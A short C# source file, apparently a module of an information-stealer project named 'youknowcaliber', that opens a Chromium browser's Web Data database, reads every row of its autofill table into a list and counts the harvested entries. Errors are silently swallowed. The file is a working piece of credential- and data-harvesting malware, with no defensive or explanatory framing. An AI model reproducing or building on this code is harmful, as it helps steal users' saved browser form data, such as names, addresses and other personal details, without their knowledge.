using System.Collections.Generic;

namespace youknowcaliber.Chromium
{
    internal sealed class Autofill
    {
      
        public static List<AutoFill> Get(string sWebData)
        {
            List<AutoFill> acAutoFillData = new List<AutoFill>();
            try
            {
                // Read data from table
                SQLite sSQLite = SqlReader.ReadTable(sWebData, "autofill");
                if (sSQLite == null) return acAutoFillData;

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {

                    AutoFill aFill = new AutoFill();

                    aFill.sName = Crypto.GetUTF8(sSQLite.GetValue(i, 0));
                    aFill.sValue = Crypto.GetUTF8(sSQLite.GetValue(i, 1));

                    Counting.AutoFill++;
                    acAutoFillData.Add(aFill);
                }
            }
            catch  { }
            return acAutoFillData;
        }
    }
}
